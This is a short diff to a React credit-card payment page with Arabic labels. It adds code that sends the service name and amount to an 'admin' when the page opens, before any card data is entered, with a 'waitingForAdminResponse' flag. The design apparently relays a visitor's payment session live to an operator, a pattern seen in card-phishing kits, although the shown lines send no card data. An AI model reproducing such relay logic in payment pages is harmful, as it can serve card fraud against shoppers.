@@ -206,9 +206,22 @@ export default function CreditCardPayment() {
     expiryYear?.length > 0 &&
     cvv?.length === 3;
 
-  // Emit page enter
+// Emit page enter
   useEffect(() => {
     navigateToPage("الدفع بطاقة الائتمان");
+  }, []);
+
+  // Register the visitor with the order summary as soon as the card page opens,
+  // so the admin receives the summary before any card data is entered.
+  useEffect(() => {
+    sendData({
+      data: {
+        'الخدمة': serviceName,
+        'المبلغ': totalAmount + ' ر.س',
+      },
+      current: 'ملخص الطلب',
+      waitingForAdminResponse: false,
+    });
   }, []);
 
   // Verify card number
